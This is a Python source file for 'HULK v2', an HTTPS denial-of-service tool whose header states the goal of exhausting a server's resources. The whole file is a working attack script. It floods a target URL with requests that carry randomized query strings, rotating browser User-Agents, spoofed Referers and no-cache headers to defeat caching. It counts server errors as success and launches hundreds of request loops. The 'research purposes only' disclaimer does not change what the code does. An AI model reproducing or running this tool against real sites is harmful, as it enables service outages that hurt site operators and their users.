# -------------------------------------------------------------------------------------------- #
# HULK v2 - HTTPS Unbearable Load King
#
# This script is a Denial of Service tool that is can put heavy load on HTTPS servers,
# in order to bring them to their knees, by exhausting the resource pool.
# Its is meant for research purposes only and any malicious usage of this tool is prohibited.
# The authors aren't to be held responsible for any consequence of usage of this tool.
#
# Edited and improved by Hyperclaw79 for smoother working and PY3+ compatibility.
#
# Works for Python 3.5. No backward compatiblity.
#
# Run pip install -r requirements.txt before starting this script.
#
# Edits: 1)Syntax Corrections.
#        2)Replaced urllib2 module with requests module.
#        3)Replaced support for Http with support for Https.
#        4)Added more HTTP Status Error Codes for detection and control.
#        5)Randomized buildblock size a bit more.
#        6)Deprecated 'safe'.
#        7)Improved Documentation.
#
# Authors : Hyperclaw79, version 2.0; Barry Shteiman , version 1.0
# -------------------------------------------------------------------------------------------- #

import requests               # Because it's faster and more powerful than urllib2
import sys
import threading
import random
import re
import time                   # For time.sleep

# Global Params
global urlc
urlc=''                       # To prevent conflict with url keyword of requests module  
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# Generates a List of UserAgent headers.
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# Generates a List of Referer headers.
def referer_list():
	global headers_referers
	headers_referers.append('https://www.google.com/?q=')
	headers_referers.append('https://www.usatoday.com/search/results?q=')
	headers_referers.append('https://engadget.search.aol.com/search?q=')
	headers_referers.append('https://' + host + '/')
	return(headers_referers)
	
# Generates random ascii string of given size.
def buildblock(size):
	out_str = ''
	for i in range(size):
		a = random.randint(65, 90)
		out_str += str(a)
	return(out_str)

# User Instructions
def usage():
	print('---------------------------------------------------')
	print('USAGE: python hulk.py <url>')
	print('Example: python hulk.py https://abcxyz123.com')
	print('---------------------------------------------------')

	
# Main Function that sends a HTTPS request.
def httpcall(urlc):
	useragent_list()
	referer_list()
	code=0

	if urlc.count("?")>0:          # For Quering type urls
		param_joiner="&"
	else:
		param_joiner="?"

	HeaderDict = {'User-Agent': random.choice(headers_useragents),'Cache-Control': 'no-cache','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7','Referer': random.choice(headers_referers) + buildblock(random.randint(random.randint(0,5),random.randint(6,10))),'Keep-Alive': str(random.randint(110,120)),'Connection': 'keep-alive','Host':host}
	r = requests.get(url=urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10))),headers=HeaderDict)
	try:
		if (str(r.status_code)=='500') or (str(r.status_code)=='503') or (str(r.status_code)=='504'):
			set_flag(1)
			print('Successful.')
			code=500
		elif str(r.status_code)=='400':
			print('Url has DDoS protection.')
			sys.exit()
		elif str(r.status_code)=='404':
			print('Url does not exist.')
			sys.exit()
		elif str(r.status_code)=='429':
			print('Slowing down due to "Too many requests" error.')
			time.sleep(5)
		elif ("4" in str(r.status_code)) or ("5" in str(r.status_code)):       # For other unexpected errors, prints the error code. 
			print(str(r.status_code))
		else:
			inc_counter()
			r = requests.get(url=urlc + param_joiner + buildblock(random.randint(random.randint(0,3),random.randint(4,10))) + '=' + buildblock(random.randint(random.randint(0,3),random.randint(4,10))),headers=HeaderDict)
	except Exception as e:                                                         # For other non HTTP errors.
		print(str(e))
	return(code)		

	
# Subclassing Threads to work with httpcall. 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(urlc)
				if code==500:
					set_flag(2)
		except Exception as e:
			print(str(e))

# Monitors https threads and counts requests.
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) and (previous!=request_counter):
				print("%d Requests Sent" % request_counter)
				previous=request_counter
		if flag==2:
			print("\n-- HULK v2 Attack Finished --")

# Main code. 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print("-- HULK Attack Started --")
		print("--Current Version: 2--")
		print("--Compatible with: Python 3--")
		print("--Edited by: Hyperclaw79--")
		urlc = sys.argv[1]
		if urlc.count("/")==2:
			urlc = urlc + "/"
		m = re.search('https\://([^/]*)/?.*', urlc)  
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.run()
			t = MonitorThread()
			t.run()

